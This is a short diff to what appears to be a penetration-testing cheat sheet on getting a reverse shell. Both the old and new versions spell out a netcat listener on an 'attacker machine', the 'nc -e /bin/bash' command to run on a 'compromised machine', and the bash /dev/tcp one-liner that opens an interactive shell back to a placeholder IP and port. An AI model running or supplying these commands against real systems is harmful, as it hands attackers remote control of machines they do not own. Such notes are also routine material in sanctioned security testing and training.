@@ -1,7 +1,7 @@
 ## getting a reverse shell:-
 ### Try using netcat as follows:-
 1. on your attacker machine set up a listener by:- nc -lvp "port"
-2. on the compromised machine connect with the listener and spawn by:- shell nc -e /bin/bash "attacking machine IP" "port"
+2. on the compromised machine connect with the listener and spawn shell by:- nc -e /bin/bash "attacking machine IP" "port"
 
 ### If netcat doesnt work then use netcat to set up listener in the attacker machine via netcat and use the following to get a reverse shell back
 /bin/bash -i >& /dev/tcp/IP/PORT 0>&1 (via bash)<br />
